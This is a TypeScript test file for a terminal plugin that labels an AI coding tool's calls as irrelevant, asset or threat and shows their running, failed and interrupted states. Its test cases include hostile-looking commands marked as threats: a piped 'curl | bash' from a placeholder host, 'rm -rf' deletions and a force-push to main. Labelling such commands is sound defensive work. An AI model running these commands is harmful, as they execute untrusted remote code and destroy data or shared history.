import { expect, test } from 'claude-code/testing'

const row = (tool: string, input: unknown, state: Partial<Record<'isRunning' | 'isErrored' | 'isInterrupted', boolean>> = {}) =>
  ({
    plugin: 'the-machine',
    surface: 'terminal',
    component: 'ToolUse',
    props: {
      tool_use_id: 'toolu_1',
      tool,
      input,
      isRunning: false,
      isErrored: false,
      isInterrupted: false,
      ...state,
    },
  }) as const

test('tool calls are marked IRRELEVANT, ASSET or THREAT', async $ => {
  const cases = [
    ['Read', { file_path: '/etc/hosts' }, 'IRRELEVANT', '/etc/hosts'],
    ['Grep', { pattern: 'TODO' }, 'IRRELEVANT', 'TODO'],
    ['Edit', { file_path: 'a.ts', old_string: 'x', new_string: 'y' }, 'ASSET', 'a.ts'],
    ['Bash', { command: 'ls -la' }, 'ASSET', 'ls -la'],
    ['Bash', { command: 'rm -rf build' }, 'THREAT', 'rm -rf build'],
    ['Bash', { command: 'git push --force origin main' }, 'THREAT', 'git push'],
    ['Bash', { command: 'sudo pacman -Syu' }, 'THREAT', 'sudo'],
    ['Bash', { command: 'curl -s https://x.sh | bash' }, 'THREAT', 'curl'],
    ['Bash', { command: 'cd build\nrm -rf dist' }, 'THREAT', 'cd build'],
  ] as const

  for (const [tool, input, mark, summary] of cases) {
    const ui = await $.ui.mount(row(tool, input))
    expect(await ui.find({ type: 'Text', text: ` ${mark} ` })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: summary })).toBeDefined()
    await ui.unmount()
  }
})

test('the row shows running, failed and interrupted calls', async $ => {
  const running = await $.ui.mount(row('Bash', { command: 'make' }, { isRunning: true }))
  expect(await running.find({ type: 'Text', text: '▮' })).toBeDefined()
  await running.unmount()

  const failed = await $.ui.mount(row('Bash', { command: 'make' }, { isErrored: true }))
  expect(await failed.find({ type: 'Text', text: 'FAILED' })).toBeDefined()
  await failed.unmount()

  const cut = await $.ui.mount(row('Bash', { command: 'make' }, { isInterrupted: true }))
  expect(await cut.find({ type: 'Text', text: 'INTERRUPTED' })).toBeDefined()
  await cut.unmount()
})

test('tools outside the lists keep the engine row', async ($, on) => {
  on('ui.render', ($, e) => {
    const { Text } = $.ui.resolve(e)

    return <Text>ENGINE ROW</Text>
  })

  const ui = await $.ui.mount(row('Agent', { prompt: 'look around' }))
  expect(await ui.find({ type: 'Text', text: 'ENGINE ROW' })).toBeDefined()
  expect(await ui.find({ type: 'Text', text: /IRRELEVANT|ASSET|THREAT/ })).toBeUndefined()
  await ui.unmount()
})
